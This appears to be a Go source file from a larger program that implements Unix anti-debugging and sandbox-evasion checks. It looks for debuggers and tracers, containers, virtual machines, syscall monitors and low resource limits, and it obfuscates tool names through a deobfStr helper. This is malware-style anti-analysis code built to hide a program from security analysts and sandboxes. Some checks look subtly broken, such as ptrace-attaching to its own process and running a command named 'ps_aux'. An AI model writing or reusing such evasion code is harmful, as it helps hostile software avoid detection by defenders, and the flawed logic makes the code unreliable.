//go:build !windows
// +build !windows

package main

import (
	"fmt"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"syscall"
)

// isDebuggerPresentImpl implements non-Windows debugger detection
func isDebuggerPresentImpl() bool {
	// Multiple detection methods for Unix systems
	methods := []func() bool{
		checkPtrace,
		checkTracerPid,
		checkDebugEnvironment,
		checkParentProcess,
	}

	detectedCount := 0
	for _, method := range methods {
		if method() {
			detectedCount++
		}
	}

	// If multiple methods detect debugging, we're likely being debugged
	return detectedCount >= 2
}

// checkPtrace attempts to use ptrace to detect if already being traced
func checkPtrace() bool {
	// Try to ptrace ourselves - if we're already being traced, this will fail
	err := syscall.PtraceAttach(os.Getpid())
	if err != nil {
		// Already being traced
		return true
	}

	// Detach if we successfully attached
	syscall.PtraceDetach(os.Getpid())
	return false
}

// checkTracerPid checks /proc/self/status for TracerPid
func checkTracerPid() bool {
	data, err := os.ReadFile("/proc/self/status")
	if err != nil {
		return false
	}

	lines := strings.Split(string(data), "\n")
	for _, line := range lines {
		if strings.HasPrefix(line, "TracerPid:") {
			parts := strings.Fields(line)
			if len(parts) >= 2 {
				pid, err := strconv.Atoi(parts[1])
				if err == nil && pid != 0 {
					return true // Being traced
				}
			}
		}
	}
	return false
}

// checkDebugEnvironment checks for debugging environment variables
func checkDebugEnvironment() bool {
	debugVars := []string{
		"GDB", "STRACE", "LTRACE", "VALGRIND", "DEBUG",
		"_", "LD_PRELOAD", "LD_DEBUG", "MALLOC_CHECK_",
	}

	for _, envVar := range debugVars {
		if value := os.Getenv(envVar); value != "" {
			// Check for debugging-related values
			debugValues := []string{
				deobfStr("gdb"), deobfStr("strace"), deobfStr("ltrace"),
				deobfStr("valgrind"), "debug", "trace",
			}

			lowerValue := strings.ToLower(value)
			for _, debugValue := range debugValues {
				if strings.Contains(lowerValue, debugValue) {
					return true
				}
			}
		}
	}
	return false
}

// checkParentProcess checks if parent process is a debugger
func checkParentProcess() bool {
	// Get parent process info
	data, err := os.ReadFile("/proc/self/stat")
	if err != nil {
		return false
	}

	fields := strings.Fields(string(data))
	if len(fields) < 4 {
		return false
	}

	ppid, err := strconv.Atoi(fields[3])
	if err != nil {
		return false
	}

	// Read parent process command line
	cmdlineFile := fmt.Sprintf("/proc/%d/cmdline", ppid)
	cmdlineData, err := os.ReadFile(cmdlineFile)
	if err != nil {
		return false
	}

	cmdline := strings.ToLower(string(cmdlineData))
	debuggers := []string{
		deobfStr("gdb"), deobfStr("strace"), deobfStr("ltrace"),
		deobfStr("valgrind"), "debugger", "trace",
	}

	for _, debugger := range debuggers {
		if strings.Contains(cmdline, debugger) {
			return true
		}
	}

	return false
}

// UnixSpecificEvasion implements Unix-specific evasion techniques
func UnixSpecificEvasion() bool {
	checks := []func() bool{
		checkContainerEnvironment,
		checkVirtualFileSystem,
		checkSystemCalls,
		checkProcessLimits,
	}

	detectedCount := 0
	for _, check := range checks {
		if check() {
			detectedCount++
		}
	}

	return detectedCount >= 2
}

// checkContainerEnvironment checks for container/sandbox indicators
func checkContainerEnvironment() bool {
	containerIndicators := []string{
		"/.dockerenv", "/proc/1/cgroup", "/.singularity.d",
		"/tmp/.com.apple.dt.CommandLineTools",
	}

	for _, indicator := range containerIndicators {
		if _, err := os.Stat(indicator); err == nil {
			return true
		}
	}

	// Check for container-specific environment variables
	containerEnvs := []string{
		"DOCKER_CONTAINER", "container", "KUBERNETES_SERVICE_HOST",
		"SINGULARITY_CONTAINER", "PODMAN_CONTAINER",
	}

	for _, env := range containerEnvs {
		if os.Getenv(env) != "" {
			return true
		}
	}

	return false
}

// checkVirtualFileSystem checks for virtual file system indicators
func checkVirtualFileSystem() bool {
	// Check /proc/version for virtualization indicators
	data, err := os.ReadFile("/proc/version")
	if err != nil {
		return false
	}

	version := strings.ToLower(string(data))
	virtIndicators := []string{
		"qemu", "kvm", "xen", "vmware", "virtualbox", "vbox",
		"hyper-v", "microsoft", "parallels",
	}

	for _, indicator := range virtIndicators {
		if strings.Contains(version, indicator) {
			return true
		}
	}

	// Check DMI information
	dmiFiles := []string{
		"/sys/class/dmi/id/product_name",
		"/sys/class/dmi/id/sys_vendor",
		"/sys/class/dmi/id/board_vendor",
	}

	for _, file := range dmiFiles {
		if data, err := os.ReadFile(file); err == nil {
			content := strings.ToLower(string(data))
			for _, indicator := range virtIndicators {
				if strings.Contains(content, indicator) {
					return true
				}
			}
		}
	}

	return false
}

// checkSystemCalls checks for system call monitoring
func checkSystemCalls() bool {
	// Check if strace or similar tools are monitoring us
	// This is a simplified check

	// Check for strace in process list
	cmd := exec.Command(deobfStr("ps_aux"), "aux")
	output, err := cmd.CombinedOutput()
	if err != nil {
		return false
	}

	outputStr := strings.ToLower(string(output))
	monitors := []string{
		deobfStr("strace"), deobfStr("ltrace"), "syscall", "monitor",
	}

	for _, monitor := range monitors {
		if strings.Contains(outputStr, monitor) {
			return true
		}
	}

	return false
}

// checkProcessLimits checks for artificial process limits
func checkProcessLimits() bool {
	// Check resource limits that might indicate sandbox
	var rlimit syscall.Rlimit

	// Check memory limit
	if err := syscall.Getrlimit(syscall.RLIMIT_AS, &rlimit); err == nil {
		// If memory limit is very low, might be sandbox
		if rlimit.Cur < 1024*1024*1024 { // Less than 1GB
			return true
		}
	}

	// Check process limit (available on most Unix systems)
	const RLIMIT_NPROC = 6 // Standard value for most Unix systems
	if err := syscall.Getrlimit(RLIMIT_NPROC, &rlimit); err == nil {
		// If process limit is very low, might be sandbox
		if rlimit.Cur < 100 {
			return true
		}
	}

	return false
}
